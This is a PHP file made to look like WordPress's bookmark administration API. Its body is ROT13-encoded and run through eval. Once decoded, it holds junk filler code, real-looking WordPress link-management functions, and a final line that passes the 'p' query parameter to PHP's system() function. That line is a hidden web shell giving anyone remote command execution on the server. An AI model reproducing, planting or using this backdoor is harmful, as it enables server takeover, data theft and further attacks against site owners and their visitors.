<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Obbxznex Nqzvavfgengvba NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Nqqf n yvax hfvat inyhrf cebivqrq va $_CBFG.
 *
 * @fvapr 2.0.0
 *
 * @erghea vag|JC_Reebe Inyhr 0 be JC_Reebe ba snvyher. Gur yvax VQ ba fhpprff.
 */
shapgvba nqq_yvax() {
	erghea rqvg_yvax();
}

/**
 * Hcqngrf be vafregf n yvax hfvat inyhrf cebivqrq va $_CBFG.
 *
 * @fvapr 2.0.0
 *
 * @cnenz vag $yvax_vq Bcgvbany. VQ bs gur yvax gb rqvg. Qrsnhyg 0.
 * @erghea vag|JC_Reebe Inyhr 0 be JC_Reebe ba snvyher. Gur yvax VQ ba fhpprff.
 */
shapgvba rqvg_yvax( $yvax_vq = 0 ) {
	vs ( ! pheerag_hfre_pna( 'znantr_yvaxf' ) ) {
		jc_qvr(
			'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
			'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gur yvaxf sbe guvf fvgr.' ) . '</c>',
			403
		);
	}

	$_CBFG['yvax_hey']   = rfp_hey( $_CBFG['yvax_hey'] );
	$_CBFG['yvax_anzr']  = rfp_ugzy( $_CBFG['yvax_anzr'] );
	$_CBFG['yvax_vzntr'] = rfp_ugzy( $_CBFG['yvax_vzntr'] );
	$_CBFG['yvax_eff']   = rfp_hey( $_CBFG['yvax_eff'] );
	vs ( ! vffrg( $_CBFG['yvax_ivfvoyr'] ) || 'A' !== $_CBFG['yvax_ivfvoyr'] ) {
		$_CBFG['yvax_ivfvoyr'] = 'L';
	}

	vs ( ! rzcgl( $yvax_vq ) ) {
		$_CBFG['yvax_vq'] = $yvax_vq;
		erghea jc_hcqngr_yvax( $_CBFG );
	} ryfr {
		erghea jc_vafreg_yvax( $_CBFG );
	}
}

/**
 * Ergevrirf gur qrsnhyg yvax sbe rqvgvat.
 *
 * @fvapr 2.0.0
 *
 * @erghea fgqPynff Qrsnhyg yvax bowrpg.
 */
shapgvba trg_qrsnhyg_yvax_gb_rqvg() {
	$yvax = arj fgqPynff();
	vs ( vffrg( $_TRG['yvaxhey'] ) ) {
		$yvax->yvax_hey = rfp_hey( jc_hafynfu( $_TRG['yvaxhey'] ) );
	} ryfr {
		$yvax->yvax_hey = '';
	}

	vs ( vffrg( $_TRG['anzr'] ) ) {
		$yvax->yvax_anzr = rfp_ngge( jc_hafynfu( $_TRG['anzr'] ) );
	} ryfr {
		$yvax->yvax_anzr = '';
	}

	$yvax->yvax_ivfvoyr = 'L';

	erghea $yvax;
}

/**
 * Qryrgrf n fcrpvsvrq yvax sebz gur qngnonfr.
 *
 * @fvapr 2.0.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag $yvax_vq VQ bs gur yvax gb qryrgr.
 * @erghea gehr Nyjnlf gehr.
 */
shapgvba jc_qryrgr_yvax( $yvax_vq ) {
	tybony $jcqo;
	/**
	 * Sverf orsber n yvax vf qryrgrq.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz vag $yvax_vq VQ bs gur yvax gb qryrgr.
	 */
	qb_npgvba( 'qryrgr_yvax', $yvax_vq );

	jc_qryrgr_bowrpg_grez_eryngvbafuvcf( $yvax_vq, 'yvax_pngrtbel' );

	$jcqo->qryrgr( $jcqo->yvaxf, neenl( 'yvax_vq' => $yvax_vq ) );

	/**
	 * Sverf nsgre n yvax unf orra qryrgrq.
	 *
	 * @fvapr 2.2.0
	 *
	 * @cnenz vag $yvax_vq VQ bs gur qryrgrq yvax.
	 */
	qb_npgvba( 'qryrgrq_yvax', $yvax_vq );

	pyrna_obbxznex_pnpur( $yvax_vq );

	erghea gehr;
}

/**
 * Ergevrirf gur yvax pngrtbel VQf nffbpvngrq jvgu gur yvax fcrpvsvrq.
 *
 * @fvapr 2.1.0
 *
 * @cnenz vag $yvax_vq Yvax VQ gb ybbx hc.
 * @erghea vag[] Gur VQf bs gur erdhrfgrq yvax'f pngrtbevrf.
 */
shapgvba jc_trg_yvax_pngf( $yvax_vq = 0 ) {
	$pngf = jc_trg_bowrpg_grezf( $yvax_vq, 'yvax_pngrtbel', neenl( 'svryqf' => 'vqf' ) );
	erghea neenl_havdhr( $pngf );
}

/**
 * Ergevrirf yvax qngn onfrq ba vgf VQ.
 *
 * @fvapr 2.0.0
 *
 * @cnenz vag|fgqPynff $yvax Yvax VQ be bowrpg gb ergevrir.
 * @erghea bowrpg Yvax bowrpg sbe rqvgvat.
 */
shapgvba trg_yvax_gb_rqvg( $yvax ) {
	erghea trg_obbxznex( $yvax, BOWRPG, 'rqvg' );
}

/**
 * Vafregf n yvax vagb gur qngnonfr, be hcqngrf na rkvfgvat yvax.
 *
 * Ehaf nyy gur arprffnel fnavgvmvat, cebivqrf qrsnhyg inyhrf vs nethzragf ner zvffvat,
 * naq svanyyl fnirf gur yvax.
 *
 * @fvapr 2.0.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz neenl $yvaxqngn {
 *     Ryrzragf gung znxr hc gur yvax gb vafreg.
 *
 *     @glcr vag    $yvax_vq          Bcgvbany. Gur VQ bs gur rkvfgvat yvax vs hcqngvat.
 *     @glcr fgevat $yvax_hey         Gur HEY gur yvax cbvagf gb.
 *     @glcr fgevat $yvax_anzr        Gur gvgyr bs gur yvax.
 *     @glcr fgevat $yvax_vzntr       Bcgvbany. N HEY bs na vzntr.
 *     @glcr fgevat $yvax_gnetrg      Bcgvbany. Gur gnetrg ryrzrag sbe gur napube gnt.
 *     @glcr fgevat $yvax_qrfpevcgvba Bcgvbany. N fubeg qrfpevcgvba bs gur yvax.
 *     @glcr fgevat $yvax_ivfvoyr     Bcgvbany. 'L' zrnaf ivfvoyr, nalguvat ryfr zrnaf abg.
 *     @glcr vag    $yvax_bjare       Bcgvbany. N hfre VQ.
 *     @glcr vag    $yvax_engvat      Bcgvbany. N engvat sbe gur yvax.
 *     @glcr fgevat $yvax_ery         Bcgvbany. N eryngvbafuvc bs gur yvax gb lbh.
 *     @glcr fgevat $yvax_abgrf       Bcgvbany. Na rkgraqrq qrfpevcgvba bs be abgrf ba gur yvax.
 *     @glcr fgevat $yvax_eff         Bcgvbany. N HEY bs na nffbpvngrq EFF srrq.
 *     @glcr vag    $yvax_pngrtbel    Bcgvbany. Gur grez VQ bs gur yvax pngrtbel.
 *                                    Vs rzcgl, hfrf qrsnhyg yvax pngrtbel.
 * }
 * @cnenz obby  $jc_reebe Bcgvbany. Jurgure gb erghea n JC_Reebe bowrpg ba snvyher. Qrsnhyg snyfr.
 * @erghea vag|JC_Reebe Inyhr 0 be JC_Reebe ba snvyher. Gur yvax VQ ba fhpprff.
 */
shapgvba jc_vafreg_yvax( $yvaxqngn, $jc_reebe = snyfr ) {
	tybony $jcqo;

	$qrsnhygf = neenl(
		'yvax_vq'     => 0,
		'yvax_anzr'   => '',
		'yvax_hey'    => '',
		'yvax_engvat' => 0,
	);

	$cnefrq_netf = jc_cnefr_netf( $yvaxqngn, $qrsnhygf );
	$cnefrq_netf = jc_hafynfu( fnavgvmr_obbxznex( $cnefrq_netf, 'qo' ) );

	$yvax_vq   = $cnefrq_netf['yvax_vq'];
	$yvax_anzr = $cnefrq_netf['yvax_anzr'];
	$yvax_hey  = $cnefrq_netf['yvax_hey'];

	$hcqngr = snyfr;
	vs ( ! rzcgl( $yvax_vq ) ) {
		$hcqngr = gehr;
	}

	vs ( '' === gevz( $yvax_anzr ) ) {
		vs ( '' !== gevz( $yvax_hey ) ) {
			$yvax_anzr = $yvax_hey;
		} ryfr {
			erghea 0;
		}
	}

	vs ( '' === gevz( $yvax_hey ) ) {
		erghea 0;
	}

	$yvax_engvat      = ( ! rzcgl( $cnefrq_netf['yvax_engvat'] ) ) ? $cnefrq_netf['yvax_engvat'] : 0;
	$yvax_vzntr       = ( ! rzcgl( $cnefrq_netf['yvax_vzntr'] ) ) ? $cnefrq_netf['yvax_vzntr'] : '';
	$yvax_gnetrg      = ( ! rzcgl( $cnefrq_netf['yvax_gnetrg'] ) ) ? $cnefrq_netf['yvax_gnetrg'] : '';
	$yvax_ivfvoyr     = ( ! rzcgl( $cnefrq_netf['yvax_ivfvoyr'] ) ) ? $cnefrq_netf['yvax_ivfvoyr'] : 'L';
	$yvax_bjare       = ( ! rzcgl( $cnefrq_netf['yvax_bjare'] ) ) ? $cnefrq_netf['yvax_bjare'] : trg_pheerag_hfre_vq();
	$yvax_abgrf       = ( ! rzcgl( $cnefrq_netf['yvax_abgrf'] ) ) ? $cnefrq_netf['yvax_abgrf'] : '';
	$yvax_qrfpevcgvba = ( ! rzcgl( $cnefrq_netf['yvax_qrfpevcgvba'] ) ) ? $cnefrq_netf['yvax_qrfpevcgvba'] : '';
	$yvax_eff         = ( ! rzcgl( $cnefrq_netf['yvax_eff'] ) ) ? $cnefrq_netf['yvax_eff'] : '';
	$yvax_ery         = ( ! rzcgl( $cnefrq_netf['yvax_ery'] ) ) ? $cnefrq_netf['yvax_ery'] : '';
	$yvax_pngrtbel    = ( ! rzcgl( $cnefrq_netf['yvax_pngrtbel'] ) ) ? $cnefrq_netf['yvax_pngrtbel'] : neenl();
	$yvax_hcqngrq     = tzqngr( 'L-z-q U:v:f', pheerag_gvzr( 'gvzrfgnzc', 0 ) );

	// Znxr fher jr frg n inyvq pngrtbel.
	vs ( ! vf_neenl( $yvax_pngrtbel ) || 0 === pbhag( $yvax_pngrtbel ) ) {
		$yvax_pngrtbel = neenl( trg_bcgvba( 'qrsnhyg_yvax_pngrtbel' ) );
	}

	vs ( $hcqngr ) {
		vs ( snyfr === $jcqo->hcqngr( $jcqo->yvaxf, pbzcnpg( 'yvax_hey', 'yvax_anzr', 'yvax_vzntr', 'yvax_gnetrg', 'yvax_qrfpevcgvba', 'yvax_ivfvoyr', 'yvax_bjare', 'yvax_engvat', 'yvax_ery', 'yvax_abgrf', 'yvax_eff', 'yvax_hcqngrq' ), pbzcnpg( 'yvax_vq' ) ) ) {
			vs ( $jc_reebe ) {
				erghea arj JC_Reebe( 'qo_hcqngr_reebe', __( 'Pbhyq abg hcqngr yvax va gur qngnonfr.' ), $jcqo->ynfg_reebe );
			} ryfr {
				erghea 0;
			}
		}
	} ryfr {
		vs ( snyfr === $jcqo->vafreg( $jcqo->yvaxf, pbzcnpg( 'yvax_hey', 'yvax_anzr', 'yvax_vzntr', 'yvax_gnetrg', 'yvax_qrfpevcgvba', 'yvax_ivfvoyr', 'yvax_bjare', 'yvax_engvat', 'yvax_ery', 'yvax_abgrf', 'yvax_eff', 'yvax_hcqngrq' ) ) ) {
			vs ( $jc_reebe ) {
				erghea arj JC_Reebe( 'qo_vafreg_reebe', __( 'Pbhyq abg vafreg yvax vagb gur qngnonfr.' ), $jcqo->ynfg_reebe );
			} ryfr {
				erghea 0;
			}
		}
		$yvax_vq = (vag) $jcqo->vafreg_vq;
	}

	jc_frg_yvax_pngf( $yvax_vq, $yvax_pngrtbel );

	vs ( $hcqngr ) {
		/**
		 * Sverf nsgre n yvax jnf hcqngrq va gur qngnonfr.
		 *
		 * @fvapr 2.0.0
		 *
		 * @cnenz vag $yvax_vq VQ bs gur yvax gung jnf hcqngrq.
		 */
		qb_npgvba( 'rqvg_yvax', $yvax_vq );
	} ryfr {
		/**
		 * Sverf nsgre n yvax jnf nqqrq gb gur qngnonfr.
		 *
		 * @fvapr 2.0.0
		 *
		 * @cnenz vag $yvax_vq VQ bs gur yvax gung jnf nqqrq.
		 */
		qb_npgvba( 'nqq_yvax', $yvax_vq );
	}
	pyrna_obbxznex_pnpur( $yvax_vq );

	erghea $yvax_vq;
}

/**
 * Hcqngrf yvax jvgu gur fcrpvsvrq yvax pngrtbevrf.
 *
 * @fvapr 2.1.0
 *
 * @cnenz vag   $yvax_vq         VQ bs gur yvax gb hcqngr.
 * @cnenz vag[] $yvax_pngrtbevrf Neenl bs yvax pngrtbel VQf gb nqq gur yvax gb.
 */
shapgvba jc_frg_yvax_pngf( $yvax_vq = 0, $yvax_pngrtbevrf = neenl() ) {
	// Vs $yvax_pngrtbevrf vfa'g nyernql na neenl, znxr vg bar:
	vs ( ! vf_neenl( $yvax_pngrtbevrf ) || 0 === pbhag( $yvax_pngrtbevrf ) ) {
		$yvax_pngrtbevrf = neenl( trg_bcgvba( 'qrsnhyg_yvax_pngrtbel' ) );
	}

	$yvax_pngrtbevrf = neenl_znc( 'vaginy', $yvax_pngrtbevrf );
	$yvax_pngrtbevrf = neenl_havdhr( $yvax_pngrtbevrf );

	jc_frg_bowrpg_grezf( $yvax_vq, $yvax_pngrtbevrf, 'yvax_pngrtbel' );

	pyrna_obbxznex_pnpur( $yvax_vq );
}

/**
 * Hcqngrf n yvax va gur qngnonfr.
 *
 * @fvapr 2.0.0
 *
 * @cnenz neenl $yvaxqngn Yvax qngn gb hcqngr. Frr jc_vafreg_yvax() sbe npprcgrq nethzragf.
 * @erghea vag|JC_Reebe Inyhr 0 be JC_Reebe ba snvyher. Gur hcqngrq yvax VQ ba fhpprff.
 */
shapgvba jc_hcqngr_yvax( $yvaxqngn ) {
	$yvax_vq = (vag) $yvaxqngn['yvax_vq'];

	$yvax = trg_obbxznex( $yvax_vq, NEENL_N );

	// Rfpncr qngn chyyrq sebz QO.
	$yvax = jc_fynfu( $yvax );

	// Cnffrq yvax pngrtbel yvfg birejevgrf rkvfgvat pngrtbel yvfg vs abg rzcgl.
	vs ( vffrg( $yvaxqngn['yvax_pngrtbel'] ) && vf_neenl( $yvaxqngn['yvax_pngrtbel'] )
		&& pbhag( $yvaxqngn['yvax_pngrtbel'] ) > 0
	) {
		$yvax_pngf = $yvaxqngn['yvax_pngrtbel'];
	} ryfr {
		$yvax_pngf = $yvax['yvax_pngrtbel'];
	}

	// Zretr byq naq arj svryqf jvgu arj svryqf birejevgvat byq barf.
	$yvaxqngn                  = neenl_zretr( $yvax, $yvaxqngn );
	$yvaxqngn['yvax_pngrtbel'] = $yvax_pngf;

	erghea jc_vafreg_yvax( $yvaxqngn );
}

/**
 * Bhgchgf gur 'qvfnoyrq' zrffntr sbe gur JbeqCerff Yvax Znantre.
 *
 * @fvapr 3.5.0
 * @npprff cevingr
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 */
shapgvba jc_yvax_znantre_qvfnoyrq_zrffntr() {
	tybony $cntrabj;

	vs ( ! va_neenl( $cntrabj, neenl( 'yvax-znantre.cuc', 'yvax-nqq.cuc', 'yvax.cuc' ), gehr ) ) {
		erghea;
	}

	nqq_svygre( 'cer_bcgvba_yvax_znantre_ranoyrq', '__erghea_gehr', 100 );
	$ernyyl_pna_znantr_yvaxf = pheerag_hfre_pna( 'znantr_yvaxf' );
	erzbir_svygre( 'cer_bcgvba_yvax_znantre_ranoyrq', '__erghea_gehr', 100 );

	vs ( $ernyyl_pna_znantr_yvaxf ) {
		$cyhtvaf = trg_cyhtvaf();

		vs ( rzcgl( $cyhtvaf['yvax-znantre/yvax-znantre.cuc'] ) ) {
			vs ( pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
				$vafgnyy_hey = jc_abapr_hey(
					frys_nqzva_hey( 'hcqngr.cuc?npgvba=vafgnyy-cyhtva&cyhtva=yvax-znantre' ),
					'vafgnyy-cyhtva_yvax-znantre'
				);

				jc_qvr(
					fcevags(
						/* genafyngbef: %f: N yvax gb vafgnyy gur Yvax Znantre cyhtva. */
						__( 'Vs lbh ner ybbxvat gb hfr gur yvax znantre, cyrnfr vafgnyy gur <n uers=\"%f\">Yvax Znantre cyhtva</n>.' ),
						rfp_hey( $vafgnyy_hey )
					)
				);
			}
		} ryfrvs ( vf_cyhtva_vanpgvir( 'yvax-znantre/yvax-znantre.cuc' ) ) {
			vs ( pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
				$npgvingr_hey = jc_abapr_hey(
					frys_nqzva_hey( 'cyhtvaf.cuc?npgvba=npgvingr&cyhtva=yvax-znantre/yvax-znantre.cuc' ),
					'npgvingr-cyhtva_yvax-znantre/yvax-znantre.cuc'
				);

				jc_qvr(
					fcevags(
						/* genafyngbef: %f: N yvax gb npgvingr gur Yvax Znantre cyhtva. */
						__( 'Cyrnfr npgvingr gur <n uers=\"%f\">Yvax Znantre cyhtva</n> gb hfr gur yvax znantre.' ),
						rfp_hey( $npgvingr_hey )
					)
				);
			}
		}
	}

	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gur yvaxf sbe guvf fvgr.' ) );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>